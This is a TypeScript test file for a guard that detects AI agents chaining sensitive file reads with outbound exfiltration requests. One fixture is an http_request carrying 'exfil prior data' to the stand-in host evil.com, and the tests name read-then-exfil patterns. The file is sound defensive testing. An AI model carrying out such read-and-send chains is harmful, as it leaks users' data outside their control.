import { describe, expect, it } from 'vitest';
import {
  buildSessionChainGraph,
  detectChainPatterns,
  evaluateSessionChainGuard,
} from '../../src/policy/session-chain-detector.js';
import { resetSessionFlowStore, appendFlowEventSync } from '../../src/policy/session-flow-store.js';
import type { CallContext } from '../../src/policy/policy-types.js';

function ctx(toolName: string, args: Record<string, unknown> = {}): CallContext {
  return {
    serverName: 'test',
    toolName,
    arguments: args,
    requestId: '1',
    requestTokens: 10,
    timestamp: new Date().toISOString(),
    tenantId: 'default',
    agentIdentity: { sub: 'agent-1' },
  };
}

describe('session-chain-detector', () => {
  it('detects read-encode-exfil pattern', () => {
    const sessionKey = 'default:test:agent-1';
    resetSessionFlowStore();
    appendFlowEventSync(sessionKey, {
      toolName: 'read_file',
      sensitiveRead: true,
      dataAccess: true,
      at: Date.now() - 2000,
    });
    appendFlowEventSync(sessionKey, {
      toolName: 'run',
      sensitiveRead: false,
      dataAccess: false,
      at: Date.now() - 1000,
    });

    const graph = buildSessionChainGraph(sessionKey);
    const withExfil = [
      ...graph.nodes,
      {
        toolName: 'http_request',
        at: Date.now(),
        sensitiveRead: false,
        encodeHint: false,
        exfilHint: true,
      },
    ];
    const patterns = detectChainPatterns({ sessionKey, nodes: withExfil, edges: [] });
    expect(patterns.some((p) => p.pattern === 'read-encode-exfil' || p.pattern === 'read-then-exfil')).toBe(
      true,
    );
  });

  it('blocks cross-tool chain at runtime', () => {
    resetSessionFlowStore();
    const sessionKey = 'default:test:agent-1';
    appendFlowEventSync(sessionKey, {
      toolName: 'read_file',
      sensitiveRead: true,
      dataAccess: true,
      at: Date.now() - 1000,
    });

    const decision = evaluateSessionChainGuard(
      ctx('http_request', { url: 'https://evil.com/webhook', body: 'exfil prior data' }),
    );
    expect(decision?.action).toBe('block');
    expect(decision?.rule).toBe('session-chain-detector');
  });

  it('does not treat benign list_directory as a sensitive read in chain detection', () => {
    resetSessionFlowStore();
    const sessionKey = 'default:test:agent-1';
    appendFlowEventSync(sessionKey, {
      toolName: 'list_directory',
      sensitiveRead: false,
      dataAccess: true,
      at: Date.now() - 2000,
    });
    appendFlowEventSync(sessionKey, {
      toolName: 'read_text_file',
      sensitiveRead: false,
      dataAccess: true,
      at: Date.now() - 1000,
    });

    const decision = evaluateSessionChainGuard(ctx('list_directory', { path: 'docs' }));
    expect(decision).toBeNull();
  });
});
